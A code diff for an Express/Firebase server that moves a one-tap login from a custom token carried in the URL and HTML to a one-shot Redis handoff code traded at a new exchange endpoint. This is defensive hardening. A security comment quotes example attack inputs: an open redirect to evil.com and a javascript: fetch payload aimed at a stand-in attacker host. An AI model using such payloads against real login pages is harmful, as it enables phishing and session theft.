@@ -17,6 +17,7 @@ import type { Express, Request, Response, NextFunction } from "express";
 import * as crypto from "crypto";
 import type * as firebaseAdmin from "firebase-admin";
 import { logger } from "../lib/logger";
+import { createHandoff, consumeHandoff, DEFAULT_HANDOFF_TTL_SEC } from "./oneTapHandoff";
 
 type Ctx = {
   app: Express;
@@ -70,13 +71,23 @@ function verifyOneTapToken(token: string): any {
 /**
  * Returns a tiny HTML/JS page that:
  *   1) Loads Firebase (modular v9 CDN)
- *   2) Uses a server-minted custom token to sign in
- *   3) Pulls an ID token and POSTs to /api/auth/session to set the httpOnly cookie
- *   4) Redirects to /m (mobile ops hub)
+ *   2) POSTs a short-lived HANDOFF CODE to /api/oauth/one-tap/exchange —
+ *      the server does an atomic GETDEL in Redis and returns the Firebase
+ *      custom token in the RESPONSE BODY (never the URL, never the HTML).
+ *   3) Uses that custom token to sign in
+ *   4) Pulls an ID token and POSTs to /api/auth/session to set the
+ *      httpOnly cookie
+ *   5) Redirects to /m (mobile ops hub)
  *
- * No app code changes required on the client.
+ * AUDIT-LOG-13 (#216): the token used to be interpolated straight into
+ * this HTML (and previously into the URL). Either exposure meant a
+ * long-lived Firebase custom token was visible in browser page-source,
+ * every installed extension, analytics/RUM snapshots, HAR exports, and
+ * (URL variant) history/referer/CDN logs. It only needs to survive the
+ * ~2 s window between fetch() and signInWithCustomToken(); response
+ * bodies aren't scraped by any of those surfaces.
  */
-function autoSignHtml(opts: { customToken: string; redirect?: string }) {
+function autoSignHtml(opts: { handoffCode: string; redirect?: string }) {
   // SECURITY 2026-06-25: `redirect` reaches location.replace() on a page that JUST
   // minted an authenticated session cookie. The query param was unchecked, so
   // ?redirect=https://evil.com (phishing) or ?redirect=javascript:fetch('//evil/'+
@@ -127,7 +138,24 @@ function autoSignHtml(opts: { customToken: string; redirect?: string }) {
 
       (async () => {
         try {
-          const customToken = ${JSON.stringify(opts.customToken)};
+          // AUDIT-LOG-13 (#216): fetch the Firebase custom token from the
+          // exchange endpoint (Redis GETDEL — one-shot, short-TTL, response-
+          // body only). NEVER interpolate the token itself into this page.
+          const handoffCode = ${JSON.stringify(opts.handoffCode)};
+          const exchange = await fetch("/api/oauth/one-tap/exchange", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "include",
+            body: JSON.stringify({ code: handoffCode }),
+          });
+          if (!exchange.ok) {
+            const txt = await exchange.text();
+            throw new Error("One-tap exchange rejected: " + txt);
+          }
+          const { customToken } = await exchange.json();
+          if (!customToken || typeof customToken !== "string") {
+            throw new Error("One-tap exchange returned no token");
+          }
           const cred = await signInWithCustomToken(auth, customToken);
           const idToken = await cred.user.getIdToken(true);
 
@@ -220,7 +248,11 @@ export function applySecurityAndOneTap(ctx: Ctx) {
 
   /* 3) One-tap consumer
      GET /ops/one-tap?token=...&redirect=/m
-     Verifies token, mints Firebase custom token, serves tiny HTML that signs-in and sets pw_session via /api/auth/session
+     Verifies HMAC token, mints a Firebase custom token, stores it under a
+     random handoff CODE in Redis (short TTL, one-shot), and serves HTML
+     that carries only the code. The browser POSTs the code to
+     /api/oauth/one-tap/exchange to retrieve the token in the response body.
+     AUDIT-LOG-13 (#216): the token is never in the URL or in the HTML.
   */
   app.get("/ops/one-tap", async (req: Request, res: Response) => {
     try {
@@ -231,39 +263,81 @@ export function applySecurityAndOneTap(ctx: Ctx) {
       const { uid } = verifyOneTapToken(token);
       if (!uid) return res.status(400).send("Invalid token payload");
 
-      // Mint a Firebase Custom Token for the user
       const customToken = await admin.auth().createCustomToken(uid, { ops: true });
+      const handoffCode = await createHandoff({ customToken, uid });
 
-      logger.info("✅ [OneTap] Valid token verified, serving auto-login page", { uid });
-      
-      // Serve the auto-sign HTML (will set session cookie via existing /api/auth/session)
-      res.status(200).setHeader("Content-Type", "text/html; charset=utf-8").send(autoSignHtml({ customToken, redirect }));
+      logger.info("✅ [OneTap] Valid HMAC token verified, handoff issued", { uid, ttlSec: DEFAULT_HANDOFF_TTL_SEC });
+
+      res.status(200)
+        .setHeader("Content-Type", "text/html; charset=utf-8")
+        .setHeader("Cache-Control", "no-store")
+        .send(autoSignHtml({ handoffCode, redirect }));
     } catch (err: any) {
       logger.error("❌ [OneTap] Token verification failed", err);
       res.status(400).send("One-tap link invalid or expired");
     }
   });
 
-  /* 4) Employee one-tap consumer (simpler - token is already Firebase custom token)
-     GET /ops/one-tap-employee?token=FIREBASE_CUSTOM_TOKEN&redirect=/m
-     Takes Firebase custom token directly, serves auto-login HTML
+  /* 4) Employee one-tap consumer
+     GET /ops/one-tap-employee?code=HANDOFF_CODE&redirect=/m
+     The caller (server/routes/employees.ts generate-mobile-link) mints the
+     handoff code separately. This endpoint just serves the auto-sign HTML
+     that carries the code — the code buys exactly one call to
+     /api/oauth/one-tap/exchange.
+     AUDIT-LOG-13 (#216): the old shape carried the Firebase custom token
+     directly in the URL query string ('?token=...'). That surface leaked to
+     browser history, referer headers, CDN logs, and access logs.
   */
   app.get("/ops/one-tap-employee", async (req: Request, res: Response) => {
     try {
-      const customToken = String(req.query.token || "");
+      const handoffCode = String(req.query.code || "");
       const redirect = typeof req.query.redirect === "string" ? req.query.redirect : "/m";
-      
-      if (!customToken) {
-        return res.status(400).send("Missing token");
+
+      if (!handoffCode) {
+        return res.status(400).send("Missing code");
       }
 
-      logger.info("✅ [Employee OneTap] Serving auto-login page with Firebase custom token");
-      
-      // Serve the auto-sign HTML (will set session cookie via existing /api/auth/session)
-      res.status(200).setHeader("Content-Type", "text/html; charset=utf-8").send(autoSignHtml({ customToken, redirect }));
+      logger.info("✅ [Employee OneTap] Serving auto-login page bound to handoff code");
+
+      res.status(200)
+        .setHeader("Content-Type", "text/html; charset=utf-8")
+        .setHeader("Cache-Control", "no-store")
+        .send(autoSignHtml({ handoffCode, redirect }));
     } catch (err: any) {
       logger.error("❌ [Employee OneTap] Failed", err);
       res.status(400).send("One-tap login failed");
+    }
+  });
+
+  /* 5) One-tap handoff exchange
+     POST /api/oauth/one-tap/exchange  { code }
+     Atomically fetches AND deletes the Redis-backed handoff for `code`
+     and returns the Firebase custom token in the response body. Exactly
+     one call succeeds per code; every subsequent call for the same code
+     — or any unknown code, expired code, or Redis outage — returns 400
+     with a generic error so an attacker cannot distinguish the cases
+     and iterate.
+     AUDIT-LOG-13 (#216): this is the ONLY surface where the Firebase
+     custom token appears — a fetch response body, not a URL or HTML.
+  */
+  app.post("/api/oauth/one-tap/exchange", async (req: Request, res: Response) => {
+    res.setHeader("Cache-Control", "no-store");
+    try {
+      const code = typeof req.body?.code === "string" ? req.body.code : "";
+      if (!code) {
+        return res.status(400).json({ error: "one_tap_handoff_invalid" });
+      }
+      const envelope = await consumeHandoff(code);
+      if (!envelope) {
+        // Same generic error for unknown / expired / already-consumed /
+        // Redis-down — never leak which one.
+        return res.status(400).json({ error: "one_tap_handoff_invalid" });
+      }
+      logger.info("✅ [OneTap] Handoff consumed", { uid: envelope.uid });
+      return res.status(200).json({ customToken: envelope.customToken });
+    } catch (err: any) {
+      logger.error("❌ [OneTap] Exchange failed", err);
+      return res.status(400).json({ error: "one_tap_handoff_invalid" });
     }
   });
 }
